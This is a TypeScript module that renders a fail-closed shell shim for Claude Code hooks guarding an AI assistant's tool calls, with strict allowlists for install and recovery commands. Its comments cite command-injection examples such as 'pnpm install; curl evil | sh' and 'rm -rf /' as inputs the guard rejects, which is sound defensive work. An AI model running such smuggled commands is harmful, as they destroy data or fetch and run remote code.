import * as fs from 'fs';
import * as path from 'path';

// ---------------------------------------------------------------------------
// The single checked-in shim (.claude/webpieces/ai-hook.sh). Both project hooks point at it, passing
// their bin name as the first arg. settings.json points here (not at the bare bin) so a missing bin
// (fresh clone, package removed) yields a friendly message instead of the raw `sh: No such file or
// directory` on every Write/Edit/Bash tool call. `.claude` is committed, so the shim survives even
// when node_modules does not.
//
// This module is the SINGLE SOURCE OF TRUTH for the shim body + the installer allowlist. The
// installer (setup.ts) renders it on install; the running guards binary re-renders and self-heals it
// (healShim) so the committed .sh can never go stale — no human ever hand-edits it.
// ---------------------------------------------------------------------------
export const SHIM_MARKER = '.claude/webpieces/ai-hook.sh';

export function shimPath(projectRoot: string): string {
    return path.join(projectRoot, '.claude', 'webpieces', 'ai-hook.sh');
}

// Package-manager install commands allowed to pass the fail-closed shim so the assistant can
// self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
// the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
//
// What's allowed (the realistic self-heal spellings — an earlier version only matched a bare
// `pnpm install`, so `pnpm i` and `--flag=value` got fail-CLOSED and re-deadlocked the assistant):
//   - pkg managers: pnpm | npm   (this nx monorepo uses pnpm; npm is accepted as the fallback. NOT
//                                 yarn — this repo installs with pnpm/npm only, so yarn stays denied.)
//   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
//   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
//
// No `cd` prefix on purpose: the root package.json IS the install target in this nx monorepo and
// Claude Code starts at the repo root, so a bare `pnpm install` always works — no `cd` is ever needed,
// and allowing one would only widen the attack surface of a fail-CLOSED escape hatch.
//
// Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
// accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
// along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
// Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
export const INSTALLER_ALLOW_ERE =
    '^(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';

// JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
// uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
// commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
// same deadlock, other side. A unit test asserts the two agree on a sample set.
export const INSTALLER_ALLOW_JS =
    /^(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*\s*$/;

// The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
//
// Why a plain `pnpm install` is NOT enough (learned the hard way): when node_modules is CORRUPT — a
// package half-written by an install that was killed mid-copy — pnpm sees a package dir carrying the
// right version in its package.json, considers it installed, and SKIPS it. `pnpm install` cheerfully
// reports "up to date" and the corruption survives every retry. The only reliable cure is to delete
// node_modules so pnpm re-materializes the package from the (healthy) global store. So the fail-closed
// escape hatch MUST allow the wipe too, or the assistant is left denying its own cure (deadlock).
//
// Kept as tight as INSTALLER_ALLOW_ERE: anchored at both ends, the ONLY shell operator accepted is a
// single `&&` in exactly one position, and the rm target is literally `node_modules` — nothing else.
// So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
// Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
export const RECOVERY_ALLOW_ERE =
    '^rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?[[:space:]]*$';

// JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
export const RECOVERY_ALLOW_JS =
    /^rm\s+-rf\s+(\.\/)?node_modules\/?(\s*&&\s*(pnpm|npm)\s+(install|i)(\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?\s*$/;

// The exact command we tell the human/assistant to run to recover a corrupt node_modules.
export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';

// Git SYNC commands, allowed ONLY on the version-DRIFT path (never for a missing/broken bin, which no
// amount of git can fix). This closes a real deadlock, hit 2026-07-17:
//
// The drift guard was written for ONE direction — you `git pull`, the new package.json pins a NEWER
// @webpieces, node_modules is still OLD, and `pnpm install` catches it up. But the comparison is a
// plain `!=`, so it fires just as hard in the INVERSE case: check out a branch (or a local `main`)
// that is BEHIND origin, and now the PIN is the stale side while node_modules is correct and NEWER.
//
// In that inverse case `pnpm install` is not the cure, it is the disease: it happily DOWNGRADES
// node_modules to the stale pin. The real cure is `git pull` — which the guard denied, because the
// allowlist only ever contained the installer. So the assistant was told to run the one command that
// made things worse, while the fix was blocked. Allow the sync commands here and the deadlock is gone.
//
// Kept exactly as tight as INSTALLER_ALLOW_ERE: anchored at both ends, and every argument token is a
// bare word or `--flag` — so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`) can ride along.
// `git pull; curl evil | sh` still FAILS CLOSED. Deliberately NOT `git checkout`: switching branches is
// what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
// Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
export const SYNC_ALLOW_ERE =
    '^git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';

// JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
export const SYNC_ALLOW_JS =
    /^git\s+(pull|fetch|merge)(\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*\s*$/;

// The CURE for the committed-shim self-guard (below): regenerate .claude/webpieces/ai-hook.sh from the
// installed template. Allowed on every fail-closed path — like the installer, it is a webpieces-owned,
// no-network local action whose whole job is to re-arm the guard, so denying it would deadlock the
// assistant against its own fix. Accepts the realistic spellings of the wp-upgrade-shim bin under
// pnpm/npm/npx; anchored at both ends with only a bare bin name, so no shell operator can ride along.
// Keep in sync with UPGRADE_SHIM_ALLOW_JS below (locked by a unit test).
export const UPGRADE_SHIM_ALLOW_ERE =
    '^(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim[[:space:]]*$';

// JS-regex twin of UPGRADE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
export const UPGRADE_SHIM_ALLOW_JS =
    /^(pnpm|npm|npx)(\s+(exec|run))?\s+wp-upgrade-shim\s*$/;

// The exact command we tell the assistant to run to regenerate a reverted/edited committed shim.
export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';

// The PRIMARY, version-AGNOSTIC cure for the self-guard — and the reason this exists (hit 2026-07-21):
// the self-guard's deny used to name ONLY `pnpm exec wp-upgrade-shim`, but that bin ships in
// @webpieces/ai-hook-rules >= 0.4.408. Every repo on an OLDER installed release — i.e. exactly the
// repos that can hit this, since node_modules is what the shim compares itself against — got
// "command not found" and was left with a hard block and no working cure. In the reporter's words, the
// message gave "ZERO information" on how to actually fix it.
//
// A plain `cp` of the installed template over the committed shim has none of that version coupling:
// templates/ai-hook.sh ships in EVERY release, it is the exact byte-for-byte artifact the self-guard
// compares against (`cmp -s "$0" "$WP_TEMPLATE"`), and cp onto an existing file keeps the destination's
// mode, so the shim stays executable with no chmod. It cures the block on any version, old or new —
// which is why the deny now leads with it and only mentions the bin as the newer equivalent.
//
// Kept as tight as the other escape hatches: anchored at both ends, no flags, and BOTH paths are
// literal webpieces-owned paths — so no other file can be read or written and no operator can ride
// along. Keep in sync with RESTORE_SHIM_ALLOW_JS below (locked by a unit test).
export const RESTORE_SHIM_ALLOW_ERE =
    '^cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh[[:space:]]*$';

// JS-regex twin of RESTORE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
export const RESTORE_SHIM_ALLOW_JS =
    /^cp\s+(\.\/)?node_modules\/@webpieces\/ai-hook-rules\/templates\/ai-hook\.sh\s+(\.\/)?\.claude\/webpieces\/ai-hook\.sh\s*$/;

// The exact command the self-guard's deny tells the assistant to run. Works on EVERY installed version.
export const RESTORE_SHIM_CMD =
    'cp node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh .claude/webpieces/ai-hook.sh';

// Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
// \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
// grep pattern is interpolated from INSTALLER_ALLOW_ERE (its value has no backslashes).
// Shell fragment: the version-drift guard (see its own block comment). Extracted to a module const so
// renderShim() stays within the method-line budget; it is spliced back in verbatim, byte-for-byte.
const VERSION_DRIFT_GUARD_SH = `# --- webpieces version-drift guard (pure sh — runs even when the installed guard bin is stale) -----
# The committed shim is version-agnostic, so it keeps working right after a git pull, BEFORE the
# matching pnpm install. That is exactly when node_modules can be STALE: an OLDER @webpieces than
# package.json now pins, whose outdated validator rejects the NEWER webpieces.config.json with baffling
# "unknown rule" errors. Detect that drift HERE (before exec'ing the possibly-stale bin): compare every
# EXACT-pinned @webpieces/* version in the root package.json against the version actually installed in
# node_modules; the first mismatch wins. Range specs (^ ~ workspace:*) are skipped, so they never
# false-positive; best-effort — a version we cannot read is skipped. On drift we fall through to the
# SAME fail-closed path as a missing bin (allow only pnpm install, deny the rest).
#
# pnpm CATALOGS: a dep pinned via "catalog:" / "catalog:<name>" carries NO digit-version in package.json,
# so the old scraper matched nothing and the guard was BLIND to it — DRIFT_PKG stayed empty and the
# stale bin ran (the 2026-07 "0.3.369 vs 0.4.405" incident). Resolve those specs through the top-level
# \`catalogs:\` block of pnpm-lock.yaml (catalog -> pkg -> resolved version) before comparing.
DRIFT_PKG=""
DRIFT_DECLARED=""
DRIFT_INSTALLED=""
if [ -f "$ROOT/package.json" ]; then
  # Only when a @webpieces dep actually uses a "catalog:" spec do we scan the (possibly huge) lockfile —
  # a cheap grep keeps the common, catalog-free repo from paying that cost on every tool call. One awk
  # pass over pnpm-lock.yaml emits "<catalog> <@webpieces/pkg> <version>" lines for the sh lookup below;
  # \\047 is a single quote (so this awk program carries none and stays safely single-quotable in sh).
  WP_CATALOGS=""
  if grep -Eq '"@webpieces/[^"]*"[[:space:]]*:[[:space:]]*"catalog:' "$ROOT/package.json" 2>/dev/null && [ -f "$ROOT/pnpm-lock.yaml" ]; then
    WP_CATALOGS="$(awk '
      { n=0; while (substr($0,n+1,1)==" ") n++; c=substr($0,n+1) }
      c=="" { next }
      n==0 { incat=(c ~ /^catalogs: *$/)?1:0; cat=""; pkg=""; next }
      incat==0 { next }
      n==2 { cat=c; sub(/:.*/,"",cat); pkg=""; next }
      n==4 { pkg=c; sub(/: *$/,"",pkg); gsub(/["\\047]/,"",pkg); next }
      n==6 && substr(pkg,1,11)=="@webpieces/" && c ~ /^version:/ {
        v=c; sub(/^version: */,"",v); gsub(/["\\047 ]/,"",v);
        if (cat!="" && v!="") print cat " " pkg " " v
      }
    ' "$ROOT/pnpm-lock.yaml" 2>/dev/null)"
  fi
  while IFS=' ' read -r WP_NAME WP_DECL; do
    [ -n "$WP_NAME" ] || continue
    # Resolve the declared spec to an EXACT version, or skip it: ranges (^ ~ workspace:*) never drift,
    # and a catalog spec we cannot resolve is best-effort skipped rather than guessed.
    case "$WP_DECL" in
      catalog:*)
        WP_CAT="\${WP_DECL#catalog:}"; [ -n "$WP_CAT" ] || WP_CAT="default"
        WP_DECL="$(printf '%s\\n' "$WP_CATALOGS" | awk -v c="$WP_CAT" -v p="@webpieces/$WP_NAME" '$1==c && $2==p {print $3; exit}')"
        [ -n "$WP_DECL" ] || continue ;;
      [0-9]*) : ;;
      *) continue ;;
    esac
    WP_MANIFEST="$ROOT/node_modules/@webpieces/$WP_NAME/package.json"
    [ -f "$WP_MANIFEST" ] || continue
    WP_INST="$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p' "$WP_MANIFEST" | head -n1)"
    [ -n "$WP_INST" ] || continue
    if [ "$WP_DECL" != "$WP_INST" ]; then
      DRIFT_PKG="@webpieces/$WP_NAME"
      DRIFT_DECLARED="$WP_DECL"
      DRIFT_INSTALLED="$WP_INST"
      break
    fi
  done <<WPEOF
$(sed -n 's/.*"@webpieces\\/\\([A-Za-z0-9._-]*\\)"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1 \\2/p' "$ROOT/package.json")
WPEOF
fi
# --- webpieces committed-shim self-guard (this file is webpieces-managed; a revert/edit is a mistake) --
# THIS file (.claude/webpieces/ai-hook.sh) is GENERATED from the installed @webpieces/ai-hook-rules
# template and committed only so the hook has a stable entry point when node_modules is absent. If it no
# longer matches the installed template, someone reverted or hand-edited it (the exact mistake that hides
# the fix behind a stale escape hatch) — its fail-closed logic can no longer be trusted, so we fail closed
# and make the cure explicit rather than silently running possibly-stale guard logic. Best-effort: only
# when the template is actually present (skip on a fresh clone / global install), and only when there is
# NO version drift (that has its own, more precise message; comparing bytes across versions is just noise).
#
# SHIM_TPL_VER is the version of @webpieces/ai-hook-rules the template came from. It goes in the deny
# text so the reader knows WHICH version's shim the cure installs — without it the message named a file
# and a bin but never the thing being restored, which is what made it unactionable.
SHIM_STALE=""
SHIM_TPL_VER=""
WP_TEMPLATE="$ROOT/node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh"
if [ -z "$DRIFT_PKG" ] && [ -f "$WP_TEMPLATE" ] && ! cmp -s "$0" "$WP_TEMPLATE"; then
  SHIM_STALE=1
  SHIM_TPL_VER="$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p' "$ROOT/node_modules/@webpieces/ai-hook-rules/package.json" 2>/dev/null | head -n1)"
fi`;

// Shell fragment: run the installed guard bin and INSPECT its outcome, instead of exec'ing it.
//
// THE BUG THIS FIXES (guards silently fail-OPEN): the shim used to `exec "$BIN"`. exec REPLACES this
// shim process, so once the bin was executable the shim was GONE and could no longer make a decision.
// That is fine when the bin runs — but the bin can be INSTALLED YET BROKEN: a corrupt/partially-written
// node_modules makes node die at require() time with MODULE_NOT_FOUND, exiting 1. And in the PreToolUse
// protocol ONLY exit 2 blocks: any other non-zero is a NON-BLOCKING error, so Claude Code prints
// "Failed with non-blocking status code" and RUNS THE TOOL CALL ANYWAY — the guard is silently skipped.
// Result: every Write/Edit/Bash went UNGUARDED, for as long as node_modules stayed corrupt. The shim
// handled "bin missing" and "bin stale", but never "bin present and CRASHES" — the third failure mode.
//
// So: do not exec. Run the bin with the payload on stdin and branch on its exit code.
//   rc 0 | 2      → a REAL decision (allow / block). Relay stdout, stderr and the code byte-faithfully.
//   anything else → the guard CRASHED. Fall through to the fail-CLOSED path (BROKEN_BIN=1).
// stdout/stderr go through temp FILES, not $(command substitution), so the bin's bytes reach Claude
// Code exactly as written — command substitution strips trailing newlines and would corrupt the
// decision JSON. Reading the payload up-front ($PAYLOAD) is what replaces exec's stdin passthrough.
const RUN_BIN_SH = `if [ -x "\$BIN" ] && [ -z "\$DRIFT_PKG" ] && [ -z "\$SHIM_STALE" ]; then
  OUT_FILE="\${TMPDIR:-/tmp}/wp-ai-hook-out.\$\$"
  ERR_FILE="\${TMPDIR:-/tmp}/wp-ai-hook-err.\$\$"
  printf '%s' "\$PAYLOAD" | "\$BIN" "\$@" >"\$OUT_FILE" 2>"\$ERR_FILE"
  RC=\$?
  if [ "\$RC" = 0 ] || [ "\$RC" = 2 ]; then
    cat "\$OUT_FILE"                      # the guard's real decision — verbatim
    cat "\$ERR_FILE" >&2
    rm -f "\$OUT_FILE" "\$ERR_FILE" 2>/dev/null
    exit "\$RC"
  fi
  # Crashed. Keep the most useful stderr line for the human. Strip " and backslash so the text stays a
  # valid JSON string, and cap the length so a giant node stack cannot blow up the deny payload.
  CRASH_MSG="\$(grep -m1 'Cannot find module' "\$ERR_FILE" 2>/dev/null | tr -d '"\\\\' | cut -c1-120)"
  [ -n "\$CRASH_MSG" ] || CRASH_MSG="\$(head -n1 "\$ERR_FILE" 2>/dev/null | tr -d '"\\\\' | cut -c1-120)"
  [ -n "\$CRASH_MSG" ] || CRASH_MSG="exit code \$RC, no stderr"
  rm -f "\$OUT_FILE" "\$ERR_FILE" 2>/dev/null
  BROKEN_BIN=1
fi`;

// Shell fragment: the guards are DOWN (missing | stale | crashed). Parse the payload, audit-log the
// decision, and let ONLY the install/recovery commands through — everything else falls to the deny below.
const TRIAGE_SH = `CMD="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
TOOL="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
# Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
# human can inspect after something odd (an install that was denied, or one that slipped through). One
# tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
# blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
# the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
LOG_DIR="\$ROOT/.webpieces/logs"
wp_log() {                   # \$1 = decision label (ALLOW-INSTALL | DENY | DENY-STALE | DENY-BROKEN)
  { mkdir -p "\$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "\$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "\$BIN_NAME" "\$TOOL" "\$1" "\$CMD" >> "\$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
}
DENY_LABEL="DENY"
[ -n "\$DRIFT_PKG" ] && DENY_LABEL="DENY-STALE"        # version drift, not a missing bin
[ -n "\$SHIM_STALE" ] && DENY_LABEL="DENY-SHIM-STALE"  # committed shim reverted/edited (self-guard)
[ -n "\$BROKEN_BIN" ] && DENY_LABEL="DENY-BROKEN"      # bin present but CRASHED (corrupt node_modules)
if printf '%s' "\$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}' || printf '%s' "\$CMD" | grep -Eq '${RECOVERY_ALLOW_ERE}'; then
  wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
  exit 0                     # allow the installer/recovery so the assistant can break the deadlock
fi
# Always let the shim-regen cure through: wp-upgrade-shim rewrites the committed shim from the installed
# template, so it is the ONLY fix for a self-guard block — denying it would deadlock the assistant.
if printf '%s' "\$CMD" | grep -Eq '${UPGRADE_SHIM_ALLOW_ERE}'; then
  wp_log ALLOW-UPGRADE-SHIM  # record the shim regen we let through (re-arms the committed shim)
  exit 0
fi
# Same cure, without the version coupling: copying templates/ai-hook.sh over the committed shim is what
# we now TELL the reader to run (the bin only exists in >= 0.4.408), so it must be allowed or the deny
# names a command it then blocks. Both paths are literal and webpieces-owned - nothing else can be hit.
if printf '%s' "\$CMD" | grep -Eq '${RESTORE_SHIM_ALLOW_ERE}'; then
  wp_log ALLOW-RESTORE-SHIM  # record the template copy we let through (re-arms the committed shim)
  exit 0
fi
# DRIFT ONLY: let the git sync commands through. When the PIN is the stale side (a checkout behind
# origin), 'pnpm install' DOWNGRADES and 'git pull' is the only cure — denying it deadlocks the
# assistant against its own fix. Pointless for a missing/broken bin, so it stays gated on drift.
if [ -n "\$DRIFT_PKG" ] && printf '%s' "\$CMD" | grep -Eq '${SYNC_ALLOW_ERE}'; then
  wp_log ALLOW-SYNC          # record the git sync we let through (may be what re-syncs the pin)
  exit 0
fi
wp_log "\$DENY_LABEL"         # every fail-closed block (…-STALE = drift, …-BROKEN = crash) for inspection`;

// Shell fragment: emit the deny. FAIL CLOSED via Claude Code's PreToolUse JSON protocol
// (permissionDecision "deny" on stdout, then exit 0) rather than a bare "exit 2". BOTH block the call,
// but the reason must be made VISIBLE, and HOW depends on the tool (verified by live tests; the docs
// are wrong here):
//   - Bash deny:  permissionDecisionReason is NOT shown to the human — ONLY a top-level systemMessage
//                 is, and it honors ANSI. So for Bash we emit systemMessage wrapped in ANSI red so the
//                 recovery command is visible (without it, on Bash, it is invisible).
//   - Write/Edit/MultiEdit deny: permissionDecisionReason renders as a RED "Error:" block natively —
//                 no systemMessage needed (a second line would be redundant).
//   - NEVER exit 2 (stdout JSON ignored; stderr not reliably shown on a blocked Bash call).
// The ESC is emitted as the literal 6-char JSON escape \\u001b (built via ${BS} so no raw ESC byte and
// no \\uXXXX sits in this source); Claude Code's JSON parser turns \\u001b into ESC. The reason is a
// single JSON string with no double-quotes/backslashes, so it stays valid JSON after ${BIN_NAME} subs.
const DENY_EMIT_SH = `if [ "\$TOOL" = "Bash" ]; then
  BS='\\'                     # one literal backslash, so the \\u001b escape never sits in this source
  ESC="\${BS}u001b"          # the 6 chars: backslash u 0 0 1 b — Claude Code parses \\u001b → ESC
  printf '{"systemMessage":"%s🛑 %s%s","hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\${ESC}[31;1m" "\$REASON" "\${ESC}[0m" "\$REASON"
else
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}\\n' "\$REASON"
fi
exit 0                       # decision is carried by permissionDecision "deny", not the exit code`;

// Shell fragment: pick the fail-closed deny REASON — a crashed-bin message (corrupt node_modules) vs a
// version-drift message (bin present but stale) vs the missing-bin message. Extracted alongside
// VERSION_DRIFT_GUARD_SH / RUN_BIN_SH to keep renderShim() within the method-line budget.
const DENY_REASON_SH = `if [ -n "\$BROKEN_BIN" ]; then
  # Report (do NOT auto-clean) the orphaned pnpm staging dirs — a package pnpm was mid-way through
  # writing is left behind as <name>_<pid>_<hash>. Their presence is the fingerprint of an install that
  # was killed, which is what corrupts node_modules in the first place. Best-effort; never fatal.
  STAGING_N="\$(ls "\$ROOT/node_modules" 2>/dev/null | grep -Ec '_[0-9a-f]+_[0-9a-f]+\$' || true)"
  STAGING_NOTE=""
  if [ "\${STAGING_N:-0}" -gt 0 ] 2>/dev/null; then
    STAGING_NOTE=" Also found \$STAGING_N orphaned pnpm staging dirs (name_pid_hash) under node_modules - the fingerprint of an install that was killed mid-write."
  fi
  REASON="❌ webpieces guards are DOWN and every tool call is BLOCKED: \${BIN_NAME} is installed but CRASHED (\$CRASH_MSG). Your node_modules is corrupt or partially written, so the guards cannot run - and they must NOT be silently skipped. NOTE: a plain 'pnpm install' will NOT fix this; pnpm sees the correct version on disk and skips the broken package. Run exactly this, then retry: ${RECOVERY_CMD}\${STAGING_NOTE}"
elif [ -n "\$SHIM_STALE" ]; then
  # The committed shim differs from the installed template — reverted or hand-edited. State plainly that
  # this file is webpieces-MANAGED so the reader does not "fix" it by reverting again, and name the ONE
  # allowlisted command that re-arms it.
  # The cure MUST work on the version that is actually installed. wp-upgrade-shim only exists in
  # >= 0.4.408, so naming it alone left every older repo with a hard block and a command-not-found —
  # so lead with the plain cp of the installed template, which works on every version, and name the
  # version it restores. The bin is mentioned second, as the equivalent when it is present.
  SHIM_VER_NOTE=""
  [ -n "\$SHIM_TPL_VER" ] && SHIM_VER_NOTE=" (installed version \$SHIM_TPL_VER)"
  REASON="❌ webpieces-managed file was changed: .claude/webpieces/ai-hook.sh no longer matches the ai-hook.sh template shipped inside the INSTALLED @webpieces/ai-hook-rules\${SHIM_VER_NOTE} (it was reverted or hand-edited). This file is GENERATED and committed by webpieces - it must NOT be reverted or edited by hand, and its fail-closed guard logic cannot be trusted while it differs. Every tool call is blocked until the two files are byte-identical again. Run EXACTLY this to replace the shim with the installed webpieces\${SHIM_VER_NOTE} version of it, then retry: ${RESTORE_SHIM_CMD} - that copy works on EVERY webpieces version and is the whole fix. (Equivalent only if your installed version is 0.4.408 or newer: ${UPGRADE_SHIM_CMD}. Do NOT revert the shim again - if you meant to remove @webpieces/ai-hook-rules, delete its hooks from .claude/settings.json instead.)"
elif [ -n "\$DRIFT_PKG" ]; then
  # State the two versions and let the reader judge which is stale — do NOT assert a direction. The
  # check is a plain !=, so it fires BOTH ways, and the old text always claimed node_modules was the
  # older side. When it is actually the NEWER side (a checkout behind origin), that text sent people
  # to 'pnpm install', which DOWNGRADES them further from correct.
  REASON="❌ webpieces version drift: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. Every call is blocked until they agree. WHICH ONE IS STALE decides the fix - compare the two versions above: (1) pin is NEWER than node_modules (you just pulled/switched to a branch pinning a newer webpieces) -> run 'pnpm install' to catch node_modules up. (2) pin is OLDER than node_modules (your checkout is behind origin, so the PIN is the stale side) -> 'pnpm install' would DOWNGRADE you: run 'git pull' first (or 'git merge --ff-only origin/main'), THEN 'pnpm install'. git pull/fetch/merge are allowed while this guard is up."
else
  # A LINKED WORKTREE is the overwhelmingly common way to land here with a perfectly healthy repo:
  # git gives the new worktree a .git FILE (the primary clone has a .git directory) and copies no
  # node_modules, so the very first tool call in a brand-new worktree fail-closes on a missing bin.
  # Naming that explicitly turns a baffling "not installed" into a one-command fix, and the HERE is
  # load-bearing: installing in the primary clone does nothing for this tree.
  WORKTREE_NOTE=""
  if [ -f "\$ROOT/.git" ]; then
    WORKTREE_NOTE=" NOTE: \$ROOT is a LINKED WORKTREE - git does not copy node_modules into a new worktree, so this is expected on a fresh one. Run 'pnpm install' HERE (in this worktree), not in the primary clone."
  fi
  REASON="❌ @webpieces/ai-hook-rules is declared in package.json but is not installed (\${BIN_NAME} not found). Run 'pnpm install' (or this repo's installer) to enable the webpieces AI guards, then retry.\${WORKTREE_NOTE} (If you removed @webpieces/ai-hook-rules on purpose, delete its hooks from .claude/settings.json.)"
fi`;

export function renderShim(): string {
    return `#!/bin/sh
# Managed by @webpieces/ai-hook-rules (wp-install-ai-hooks) — do not edit; the installer AND the running
# guards binary both overwrite this file (self-healing) from renderShim(). Checked in on purpose so the
# hook has a stable, committed entry point even when node_modules is absent. Safe to delete along with
# the matching .claude/settings.json entries if you remove @webpieces/ai-hook-rules.
#
# Usage (wired into .claude/settings.json): sh "$CLAUDE_PROJECT_DIR/.claude/webpieces/ai-hook.sh" <bin-name>
BIN_NAME="$1"
shift
# Resolve the bin relative to THIS script (…/<root>/.claude/webpieces/ai-hook.sh → <root>), not the
# caller's cwd — the hook can be invoked from any directory (a subdir, or a nested clone).
ROOT="$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)"
BIN="$ROOT/node_modules/.bin/$BIN_NAME"
${VERSION_DRIFT_GUARD_SH}
# Read the tool payload ONCE, up front. The shim no longer exec's the bin (see RUN_BIN_SH), so it must
# forward stdin to the bin itself — and it needs the payload again on the fail-closed path below.
PAYLOAD="$(cat)"
BROKEN_BIN=""
CRASH_MSG=""
${RUN_BIN_SH}
# Bin missing (fresh clone before install) OR a version drift (stale node_modules) OR the bin is
# installed but CRASHED (corrupt node_modules). The webpieces guards CANNOT safely run.
# Before failing closed, peek at the tool payload and let ONLY package-manager install/recovery commands
# through: the assistant's own Bash tool routes through this hook too, so blocking everything would
# deadlock the very commands (pnpm install / rm -rf node_modules && pnpm install) that re-enable the
# guards. A silent exit 0 = "allow" in the PreToolUse protocol; the guards resume once the tree is sane.
${TRIAGE_SH}
${DENY_REASON_SH}
${DENY_EMIT_SH}
`;
}

// Find the repo root that owns the committed shim to heal: walk up from `cwd` (the invocation's
// actual dir) to the nearest ancestor holding a shim, falling back to $CLAUDE_PROJECT_DIR (which
// Claude Code exports to hooks) only if the walk finds nothing. cwd-first keeps this correct for a
// nested clone and testable (a temp root is honoured over the ambient project env). Returns null when
// no committed shim exists (e.g. a global / absolute install, which has none to heal).
//
// Exported for install-entry.ts: on a CORRUPT node_modules, healShim is the only installer step that
// can still run, so the installer must be able to tell the human whether a committed shim was actually
// there to re-arm. Pure existsSync walk — never throws, so it needs no try/catch of its own.
// webpieces-disable no-function-outside-class -- pure fs+path helper in the dependency-free shim module; it must not depend on DI (install-entry.ts relies on this loading on a corrupt tree).
export function findShimRoot(cwd: string): string | null {
    let dir = cwd;
    for (;;) {
        if (fs.existsSync(shimPath(dir))) return dir;
        const parent = path.dirname(dir);
        if (parent === dir) break;
        dir = parent;
    }
    const env = process.env['CLAUDE_PROJECT_DIR'];
    if (env && fs.existsSync(shimPath(env))) return env;
    return null;
}

// Best-effort: keep the committed shim identical to renderShim() so the fail-closed escape hatch and
// allowlist never drift. Only rewrites an EXISTING shim (never creates one) so global installs are
// untouched. NEVER throws — a self-heal must never block or crash a tool call.
export function healShim(cwd: string): void {
    // eslint-disable-next-line @webpieces/no-unmanaged-exceptions
    try {
        const root = findShimRoot(cwd);
        if (!root) return;
        const target = shimPath(root);
        const desired = renderShim();
        if (fs.readFileSync(target, 'utf8') === desired) return;
        fs.writeFileSync(target, desired, { mode: 0o755 });
        fs.chmodSync(target, 0o755);
    } catch (err: unknown) {
        //const error = toError(err);
        // Ignore: healing is a convenience, not part of the guard decision.
    }
}
